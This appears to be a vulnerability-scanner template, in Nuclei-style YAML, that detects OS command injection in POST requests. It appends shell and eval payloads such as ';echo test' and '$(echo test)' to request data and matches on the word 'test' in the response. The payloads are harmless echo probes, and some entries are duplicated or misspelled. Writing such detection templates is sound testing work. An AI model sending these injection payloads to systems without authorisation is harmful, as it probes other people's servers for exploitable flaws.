id: mr12-osInjectionPost
info:
  name: os InjectionGet Detection for Post 
  description: Template to check foros InjectionGet vulnerabilities ; chage the post requests
  severity: high
  author: mr12
  tags:
    - osInjection
requests:
  - raw:
      - |-
        POST {{endPoint}} HTTP/2
        Host: {{Hostname}}
        {{headers}}

        {{PosData}}{{osPayloads}}
    payloads:
      osPayloads:
        - ";echo test"
        - ";echo test #"
        - "& echo test #"
        - ";echo test #"
        - "& echo test &"
        - "| echo test"
        - "# echo test"
        - "| echo test"
        - "$(echo test)"
        - "|| echo test"
        - "| echo test |"
        - "|| echo test ||"
        - ";echo test;"
        - "` ehoc test `"
        - "%0a echo test %0a "
        - ";echo test|"
        - ";|/usr/bin/echo test|"
        - "\n/bin/echo test \n"
        - ;system('echo test')
        - ;system('echo test')
        - ;system('echo test')
        - eval('echo test')
        - eval('echo test');
        - response.write test
        - :response.write test

    matchers-condition: or
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - "test"
      
